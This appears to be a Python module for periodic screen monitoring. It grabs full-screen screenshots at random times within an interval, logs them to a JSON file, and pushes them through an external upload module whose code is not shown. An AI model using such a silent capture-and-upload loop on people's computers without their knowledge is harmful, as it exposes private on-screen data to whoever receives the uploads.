from PIL               import ImageGrab;

from shared.config     import SCREENSHOTS_PATH, SCREENSHOT_DELAY_INTERVAL, SNAPSHOTS_JSON;
from shared.time_utils import get_current_time;
from shared.utils      import read_json, write_json;

from shared.eth        import push_snapshots, upload_local;
from shared.acl        import apply_basic_rule;

from shared.cmd        import pause;

import random;
import time;
import os;

# for debug basically

DEBUG   = False;
USE_ETH = True;


def grab_screen(path):
    # saving screenshot
    
    screenshot = ImageGrab.grab();
    screenshot.save(path);
    
    # permission rights
    
    apply_basic_rule(path, log=False);

def new_snapshot():
    utc             = get_current_time();
    screenshot_name = str(utc) + '.jpg';
    path            = os.path.join(SCREENSHOTS_PATH, screenshot_name);
    
    obj = {
        "screenshot_path": path,
        "utc": utc,
        "sent": False
    };
    
    return obj;

def get_snapshot_delay():
    if (DEBUG):
        delay = random.randint(0, 60);
        rest  = 0;
    else:
        total_sec = SCREENSHOT_DELAY_INTERVAL * 60;
        delay = random.randint(0, total_sec);
        rest  = total_sec - delay;
    return delay, rest;

def take_snapshot():
    sp = new_snapshot();
    grab_screen(sp["screenshot_path"]);
    return sp;

def screenmon():
    snapshots = read_json(SNAPSHOTS_JSON);

    while True:
        delay, rest = get_snapshot_delay();
        
        time.sleep(delay);
        
        sp = take_snapshot();
        snapshots.append(sp);
        
        write_json(SNAPSHOTS_JSON, snapshots);
        
        # eth part
        
        if (USE_ETH):
            push_snapshots(snapshots);
            upload_local();
        
        time.sleep(rest);

